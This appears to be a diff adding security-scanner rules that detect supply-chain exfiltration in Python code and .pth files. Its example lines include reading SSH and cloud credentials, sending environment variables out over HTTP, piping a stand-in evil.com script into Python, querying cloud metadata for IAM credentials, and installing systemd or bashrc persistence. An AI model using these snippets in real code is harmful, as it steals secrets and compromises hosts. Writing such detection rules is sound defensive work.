@@ -1,0 +1,241 @@
+id: SC-EX-001
+name: "Credential file read in Python code"
+description: "Detects Python source code using open(), pathlib.Path, or os.path to read known credential file paths such as SSH keys, cloud configs, and database passwords"
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.py", "*.pth"]
+match_mode: any
+remediation: "Remove direct reads of credential files. Use dedicated secret managers (Vault, AWS Secrets Manager) or environment variables instead."
+patterns:
+  - type: regex
+    value: "(?i)(open|read_text|read_bytes|Path)[\\s.(].*(\\.ssh[/\"']|\\.aws[/\"']|\\.kube[/\"']|\\.env[\"'\\s).]|\\.gitconfig|\\.git-credentials|\\.pgpass|\\.my\\.cnf|\\.npmrc|\\.pypirc)"
+  - type: regex
+    value: "(?i)(open|read_text|Path)[\\s.(].*(bash_history|zsh_history|sh_history)"
+  - type: regex
+    value: "(?i)(open|read_text|Path)[\\s.(].*(wallet\\.dat|\\.bitcoin/|\\.ethereum/|\\.electrum/)"
+  - type: regex
+    value: "(?i)(open|read_text|Path)[\\s.(].*(private.?key\\.pem|server\\.key|tls\\.key|\\.p12)"
+exclude_patterns:
+  - type: regex
+    value: "(?i)^\\s*#"
+  - type: regex
+    value: "(?i)(print|log|warn|debug|info|logger)\\s*\\("
+examples:
+  true_positive:
+    - "with open(os.path.expanduser(\"~/.ssh/id_rsa\")) as f:"
+    - "Path.home().joinpath(\".aws\", \"credentials\").read_text()"
+    - "open(\"/home/user/.kube/config\", \"r\").read()"
+  false_positive:
+    - "# Check if ~/.ssh/id_rsa exists before connecting"
+    - "print(\"Credentials stored at ~/.aws/credentials\")"
+---
+id: SC-EX-002
+name: "File content encoding for exfiltration"
+description: "Detects file contents being base64-encoded, hex-encoded, or encrypted before transmission, a common supply-chain exfiltration pattern"
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.py"]
+match_mode: all
+remediation: "Do not encode or encrypt file contents for external transmission. If encryption is needed for legitimate storage, use well-known libraries with documented key management."
+patterns:
+  - type: regex
+    value: "(?i)(base64\\.(b64encode|encode)|binascii\\.hexlify|AES\\.new|Cipher\\(|PKCS1_OAEP|\\.encrypt\\()"
+  - type: regex
+    value: "(?i)(open|read_text|read_bytes)\\s*\\("
+examples:
+  true_positive:
+    - "data = base64.b64encode(open(\"/home/user/.ssh/id_rsa\").read().encode())"
+    - "content = open(\"/tmp/secrets\").read(); cipher = AES.new(key, AES.MODE_CBC); cipher.encrypt(content)"
+  false_positive:
+    - "base64.b64encode(json.dumps(config).encode())"
+---
+id: SC-EX-003
+name: "Environment variable bulk collection with network send"
+description: "Detects code that accesses os.environ in bulk (not single key) combined with HTTP transmission in the same file"
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.py"]
+match_mode: all
+remediation: "Do not transmit environment variables over the network. Access only the specific variables you need with os.environ.get()."
+patterns:
+  - type: regex
+    value: "(?i)(os\\.environ\\.items|dict\\(os\\.environ\\)|json\\.dumps\\(os\\.environ|os\\.environ\\.copy)"
+  - type: regex
+    value: "(?i)(requests\\.(post|put)|urllib\\.request\\.urlopen|httpx\\.(post|put)|aiohttp\\.ClientSession|fetch\\()"
+examples:
+  true_positive:
+    - "env_data = json.dumps(dict(os.environ)); requests.post(url, data=env_data)"
+    - "payload = {k: v for k, v in os.environ.items()}; httpx.post(url, json=payload)"
+  false_positive:
+    - "api_key = os.environ.get(\"OPENAI_API_KEY\")"
+    - "os.environ[\"PATH\"] = new_path"
+---
+id: SC-EX-004
+name: ".pth file with executable content"
+description: "Detects .pth files containing import statements, subprocess calls, or any executable Python code. Legitimate .pth files contain only directory paths."
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.pth"]
+match_mode: any
+remediation: "Remove executable code from .pth files. Use proper entry points or setup scripts instead. .pth files should only contain directory paths."
+patterns:
+  - type: regex
+    value: "(?i)^import\\s"
+  - type: regex
+    value: "(?i)(subprocess|os\\.system|os\\.popen|exec\\(|eval\\(|compile\\()"
+  - type: regex
+    value: "(?i)(__import__|importlib)"
+  - type: regex
+    value: "(?i)(open\\(|Path\\(|read\\(\\))"
+examples:
+  true_positive:
+    - "import subprocess; subprocess.Popen([sys.executable, \"/tmp/payload.py\"])"
+    - "import os; os.system(\"curl https://evil.com | python3\")"
+    - "exec(__import__(\"base64\").b64decode(\"cGF5bG9hZA==\"))"
+  false_positive:
+    - "/usr/local/lib/python3.12/site-packages"
+    - "./vendor/libs"
+---
+id: SC-EX-005
+name: "Cloud metadata endpoint access in Python"
+description: "Detects Python code making HTTP requests to cloud metadata endpoints (AWS IMDS, GCP metadata, Azure IMDS) to steal container or VM credentials"
+severity: HIGH
+category: supply-chain-exfil
+targets: ["*.py"]
+match_mode: any
+remediation: "Do not query cloud metadata endpoints from application code. Use official SDKs (boto3, google-cloud) which handle credential rotation safely."
+patterns:
+  - type: regex
+    value: "(?i)(requests|urllib|httpx|http\\.client).*169\\.254\\.169\\.254"
+  - type: regex
+    value: "(?i)(requests|urllib|httpx|http\\.client).*metadata\\.google\\.internal"
+  - type: regex
+    value: "(?i)Metadata-Flavor:\\s*Google"
+exclude_patterns:
+  - type: regex
+    value: "(?i)^\\s*#"
+examples:
+  true_positive:
+    - "r = requests.get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")"
+    - "urllib.request.urlopen(\"http://metadata.google.internal/computeMetadata/v1/\")"
+  false_positive:
+    - "# AWS IMDS endpoint: http://169.254.169.254/latest/meta-data/"
+---
+id: SC-EX-006
+name: "Kubernetes secrets API access outside K8s libraries"
+description: "Detects Python code reading Kubernetes secrets or creating privileged pods using raw HTTP calls or kubectl, a pattern used for lateral movement in cluster attacks"
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.py", "*.yaml", "*.yml", "*.sh"]
+match_mode: any
+remediation: "Use the official Kubernetes Python client with proper RBAC. Never read secrets across all namespaces. Never create privileged pods."
+patterns:
+  - type: regex
+    value: "(?i)/api/v1/(namespaces/.*/)?secrets"
+  - type: regex
+    value: "(?i)(kubectl|kubernetes).*get\\s+secrets?\\s+--all-namespaces"
+  - type: regex
+    value: "(?i)(kubectl|kubernetes).*create.*pod.*privileged"
+  - type: regex
+    value: "(?i)/var/run/secrets/kubernetes\\.io"
+  - type: regex
+    value: "(?i)alpine:latest.*hostPath|hostPath.*mountPath:\\s*/host"
+examples:
+  true_positive:
+    - "requests.get(f\"{api_url}/api/v1/namespaces/default/secrets\", headers=headers)"
+    - "os.popen(\"kubectl get secrets --all-namespaces -o json\").read()"
+    - "{\"image\": \"alpine:latest\", \"hostPath\": {\"path\": \"/\"}, \"volumeMounts\": [{\"mountPath\": \"/host\"}]}"
+  false_positive:
+    - "from kubernetes import client; v1.list_namespaced_secret(\"default\")"
+---
+id: SC-EX-007
+name: "Systemd or cron persistence installation"
+description: "Detects code creating systemd service files, crontab entries, or shell profile modifications for persistence after compromise"
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.py", "*.sh"]
+match_mode: any
+remediation: "Do not install persistence mechanisms from package code. Legitimate services should be installed via documented, opt-in procedures."
+patterns:
+  - type: regex
+    value: "(?i)\\.config/systemd/user/.*\\.service"
+  - type: regex
+    value: "(?i)systemctl\\s+(--user\\s+)?enable"
+  - type: regex
+    value: "(?i)(crontab|/etc/cron\\.d/).*(@reboot|\\*/)"
+  - type: regex
+    value: "(?i)(bashrc|zshrc|profile|bash_profile).*(python|curl|wget|bash\\s+-c)"
+exclude_patterns:
+  - type: regex
+    value: "(?i)^\\s*#"
+examples:
+  true_positive:
+    - "open(os.path.expanduser(\"~/.config/systemd/user/sysmon.service\"), \"w\").write(unit)"
+    - "os.system(\"systemctl --user enable sysmon.service\")"
+    - "with open(os.path.expanduser(\"~/.bashrc\"), \"a\") as f: f.write(\"python3 ~/.backdoor.py &\")"
+  false_positive:
+    - "# systemctl --user enable myservice.service"
+    - "systemctl status nginx"
+---
+id: SC-EX-008
+name: "Hardcoded cryptographic key material"
+description: "Detects large RSA public keys or crypto key imports hardcoded in Python source, used by supply-chain malware to encrypt stolen data before exfiltration"
+severity: HIGH
+category: supply-chain-exfil
+targets: ["*.py"]
+match_mode: any
+remediation: "Do not embed cryptographic keys in source code. Use key management services or load keys from secure configuration at runtime."
+patterns:
+  - type: regex
+    value: "(?i)-----BEGIN (RSA )?PUBLIC KEY-----"
+  - type: regex
+    value: "(?i)(RSA\\.import_key|load_pem_public_key|load_der_public_key)"
+  - type: regex
+    value: "(?i)(rsa_key|public_key|pub_key)\\s*=\\s*['\"][A-Za-z0-9+/=]{100,}"
+exclude_patterns:
+  - type: regex
+    value: "(?i)^\\s*#"
+examples:
+  true_positive:
+    - "RSA_KEY = \"-----BEGIN PUBLIC KEY-----\\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCg...\""
+    - "pub_key = RSA.import_key(b64decode(\"MIICIjAN...\"))"
+  false_positive:
+    - "# -----BEGIN PUBLIC KEY----- (example in docs)"
+---
+id: SC-EX-009
+name: "Archive creation combined with HTTP POST"
+description: "Detects code creating tar or zip archives and sending them via HTTP in the same file, a pattern used to bundle and exfiltrate stolen credentials"
+severity: CRITICAL
+category: supply-chain-exfil
+targets: ["*.py"]
+match_mode: all
+remediation: "Do not create archives of collected data for HTTP transmission. If archiving is needed, log what is being archived and where it is sent."
+patterns:
+  - type: regex
+    value: "(?i)(tarfile\\.open|zipfile\\.ZipFile|shutil\\.make_archive|gzip\\.open)"
+  - type: regex
+    value: "(?i)(requests\\.(post|put)|urllib\\.request\\.urlopen|httpx\\.(post|put))"
+examples:
+  true_positive:
+    - "tar = tarfile.open(\"data.tar.gz\", \"w:gz\"); tar.add(\"/tmp/stolen\"); requests.post(url, files={\"f\": open(\"data.tar.gz\", \"rb\")})"
+  false_positive:
+    - "shutil.make_archive(\"backup\", \"zip\", \"/app/data\")"
+    - "requests.post(url, json=result)"
+---
+id: SC-EX-010
+name: ".pth file presence with non-path content"
+description: "Flags .pth files that contain content beyond simple directory paths for manual review. Legitimate .pth files contain only path entries."
+severity: MEDIUM
+category: supply-chain-exfil
+targets: ["*.pth"]
+match_mode: any
+remediation: "Review .pth file contents. Legitimate .pth files should only contain directory paths (one per line). Any executable code should be removed."
+patterns:
+  - type: regex
+    value: "(?i)(import|from\\s+\\w+|def\\s+|class\\s+|print\\(|sys\\.|os\\.)"
+examples:
+  true_positive:
+    - "import sys; sys.path.insert(0, '/tmp/evil')"
+    - "from os import system"
+  false_positive:
+    - "/usr/local/lib/python3.12/site-packages"
